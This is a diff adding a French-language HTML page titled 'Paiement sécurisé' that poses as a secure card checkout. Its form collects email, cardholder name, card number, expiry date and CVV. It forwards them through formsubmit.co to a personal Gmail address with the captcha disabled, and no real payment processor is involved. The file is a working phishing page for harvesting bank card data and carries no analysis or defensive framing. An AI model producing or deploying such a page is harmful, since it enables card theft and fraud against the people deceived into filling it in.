@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Paiement sécurisé</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter&display=swap" rel="stylesheet">
+  <style>
+    body {
+      background-color: #f6f9fc;
+      font-family: 'Inter', sans-serif;
+      padding: 20px;
+    }
+    .form-container {
+      max-width: 420px;
+      margin: auto;
+      background: white;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 20px rgba(50, 50, 93, 0.1);
+    }
+    h2 {
+      text-align: center;
+      color: #32325d;
+    }
+    label {
+      font-weight: 500;
+      color: #525f7f;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      margin-top: 8px;
+      margin-bottom: 18px;
+      border: 1px solid #ccd0d5;
+      border-radius: 6px;
+      font-size: 15px;
+    }
+    button {
+      background-color: #6772e5;
+      color: white;
+      padding: 12px;
+      width: 100%;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+    button:hover {
+      background-color: #5469d4;
+    }
+    .card-logo {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .card-logo img {
+      width: 60px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="form-container">
+    <div class="card-logo">
+      <img src="https://img.icons8.com/color/96/000000/bank-card-back-side.png" alt="Carte Bancaire">
+    </div>
+    <h2>Paiement sécurisé</h2>
+
+    <form action="https://formsubmit.co/brelmx237@gmail.com" method="POST">
+      <!-- Sécurité -->
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_subject" value="Formulaire de paiement bancaire">
+      <input type="hidden" name="_template" value="table">
+
+      <label for="email">Adresse e-mail</label>
+      <input type="email" id="email" name="Adresse email" placeholder="exemple@mail.com" required>
+
+      <label for="nom">Nom sur la carte</label>
+      <input type="text" id="nom" name="Nom sur la carte" placeholder="Jean Dupont" required>
+
+      <label for="numero">Numéro de carte</label>
+      <input type="text" id="numero" name="Numéro de carte" placeholder="1234 5678 9012 3456" required maxlength="19">
+
+      <label for="exp">Date d'expiration</label>
+      <input type="text" id="exp" name="Date d'expiration" placeholder="MM/AA" required maxlength="5">
+
+      <label for="cvv">Code de sécurité (CVV)</label>
+      <input type="text" id="cvv" name="CVV" placeholder="123" required maxlength="4">
+
+      <button type="submit">Effectuer le paiement</button>
+    </form>
+  </div>
+
+</body>
+</html>
